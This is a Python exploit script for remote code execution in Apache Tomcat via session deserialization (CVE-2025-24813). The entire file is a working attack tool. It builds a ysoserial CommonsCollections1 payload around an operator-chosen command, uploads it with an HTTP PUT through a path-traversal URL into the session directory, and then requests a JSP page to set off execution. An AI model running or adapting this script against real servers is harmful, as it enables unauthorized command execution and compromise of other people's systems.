#!/usr/bin/env python3
# Exploit Title: Apache Tomcat - Remote Code Execution via Session Deserialization (CVE-2025-24813)
# CVE: CVE-2025-24813
# Category: Remote
# Type: RCE
# Description:
# This exploit leverages a Remote Code Execution vulnerability in Apache Tomcat due to unsafe deserialization of session files.
# By uploading a malicious serialized Java payload to a writable session directory and triggering a request to a JSP file,
# the attacker can achieve arbitrary command execution on the server.

import requests
import os
import random
import string
import subprocess
import argparse

def random_session(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_payload(command, filename):
    try:
        print("[*] Creating serialized payload...")
        with open(filename, 'wb') as f:
            subprocess.run(["java", "-jar", "ysoserial.jar", "CommonsCollections1", command], stdout=f, check=True)
        print(f"[+] Payload written to: {filename}")
    except Exception as e:
        print(f"[!] Failed to create payload: {e}")
        exit(1)

def check_put(target):
    try:
        url = f"{target}/check.txt"
        r = requests.put(url, data="test")
        return r.status_code in [200, 201, 204, 409]
    except:
        return False

def upload_payload(target, session_name, filename):
    url = f"{target}/uploads/../sessions/{session_name}.session"
    headers = {"Content-Type": "application/octet-stream"}
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        r = requests.put(url, headers=headers, data=data)
        print(f"[*] Upload response: {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"[!] Upload failed: {e}")
        return 0

def trigger_payload(target):
    try:
        r = requests.get(f"{target}/index.jsp", timeout=5)
        return r.status_code
    except Exception as e:
        print(f"[!] Trigger error: {e}")
        return 0

def clean_file(f):
    try:
        os.remove(f)
        print("[*] Temporary file removed.")
    except:
        pass

def main():
    parser = argparse.ArgumentParser(description="Apache Tomcat RCE Exploit - CVE-2025-24813")
    parser.add_argument("target", help="Target URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cmd", default="id", help="Command to execute on target")
    args = parser.parse_args()

    if not check_put(args.target):
        print("[-] Target does not support PUT method.")
        return

    session = random_session()
    payload_file = "payload.ser"

    build_payload(args.cmd, payload_file)

    status = upload_payload(args.target, session, payload_file)
    if status in [200, 201, 409]:
        print("[+] Payload uploaded successfully.")
        result = trigger_payload(args.target)
        if result == 500:
            print(f"[+] Target {args.target} is vulnerable to CVE-2025-24813!")
        else:
            print("[-] Deserialization did not trigger (try different JSP path).")
    else:
        print("[-] Payload upload failed.")

    clean_file(payload_file)

if __name__ == "__main__":
    main()
